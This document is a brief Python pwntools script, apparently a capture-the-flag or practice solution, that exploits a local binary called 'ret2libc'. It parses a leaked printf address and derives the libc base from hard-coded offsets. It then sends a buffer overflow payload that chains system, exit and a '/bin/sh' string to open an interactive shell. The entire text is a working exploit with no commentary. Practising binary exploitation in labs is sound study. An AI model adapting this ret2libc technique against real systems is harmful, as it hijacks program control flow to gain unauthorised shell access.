from pwn import *

p = process("./ret2libc")

p.recvuntil(": ")
printf = p.recvuntil("\n")
printf = int(printf, 16)

libc_base = printf - 0x4cdd0
system = libc_base + 0x3fe70
binsh = libc_base + 0x15ffcc
exit = libc_base + 0x32f50

payload = "\x90"*66
payload += p32(system)
payload += p32(exit)
payload += p32(binsh)

p.send(payload)
p.interactive()
